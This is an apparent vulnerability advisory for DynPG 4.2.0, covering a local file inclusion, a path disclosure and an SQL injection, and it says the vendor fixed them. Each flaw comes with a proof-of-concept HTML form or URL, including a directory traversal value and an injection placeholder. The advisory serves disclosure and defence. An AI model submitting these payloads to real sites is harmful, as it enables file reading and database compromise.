@@ -1,0 +1,57 @@
+Vulnerability ID: HTB22703
+Reference: http://www.htbridge.ch/advisory/lfi_in_dynpg.html
+Product: DynPG 
+Vendor: dynpg.org ( http://www.dynpg.org/ ) 
+Vulnerable Version: 4.2.0 
+Vendor Notification: 16 November 2010 
+Vulnerability Type: Local File Inclusion
+Status: Fixed by Vendor
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Local File Inclusion:
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in CHG_DYNPG_SET_LANGUAGE variable.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://dynpg/index.php" method="post" name="main" >
+<input type="hidden" name="SYSTEM_NAME" value="[admin_login]" />
+<input type="hidden" name="SYSTEM_PASSWORD" value="[admin_password]" />
+<input type="hidden" name="SET_LANGUAGE" value="1" />
+<input type="hidden" name="CHG_DYNPG_SET_LANGUAGE" value="../../../../../" />
+<input type="submit" value="submit" name="submit" />
+</form>
+
+
+Solution: Upgrade to the most recent version
+
+Path Disclosure:
+Vulnerability Details:
+The vulnerability exists due to failure in the "/languages.inc.php" script, it's possible to generate an error that will reveal the full path of the script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+http://[host]/languages.inc.php
+
+Solution: Upgrade to the most recent version
+
+SQL Injection:
+Vulnerability Details:
+The vulnerability exists due to failure in the "_rights.php" script to properly sanitize user-supplied input in "giveRights_UserId" variable. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://[host]/_rights.php" method="post" name="main" >
+<input type="hidden" name="saveRights" value="1" />
+<input type="hidden" name="giveRights_giveright" value="1" />
+<input type="hidden" name="giveRights_UserId" value="123'SQL_CODE_HERE" />
+<input type="submit" value="submit" name="submit" />
+</form>
+
+
+Solution: Upgrade to the most recent version
